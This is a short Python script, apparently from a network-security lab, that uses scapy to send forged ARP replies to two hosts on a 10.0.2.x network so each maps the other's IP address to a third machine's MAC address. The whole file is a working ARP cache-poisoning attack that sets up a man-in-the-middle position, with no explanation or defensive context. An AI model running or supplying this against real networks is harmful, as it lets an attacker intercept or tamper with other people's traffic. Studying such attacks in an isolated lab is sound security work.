from scapy.all import *

A_IP = "10.0.2.12"
A_MAC = "00:0c:29:33:31:2e"
B_IP = "10.0.2.10"
B_MAC = "00:0c:29:c6:b2:35"
M_MAC = "00:0c:29:b7:8f:c6"

# poison A
packet = Ether(dst=A_MAC) / ARP(
    op=2, hwsrc=M_MAC, psrc=B_IP, hwdst=A_MAC, pdst=A_IP)

sendp(packet)

# poison B
packet = Ether(dst=B_MAC) / ARP(
    op=2, hwsrc=M_MAC, psrc=A_IP, hwdst=B_MAC, pdst=B_IP)

sendp(packet)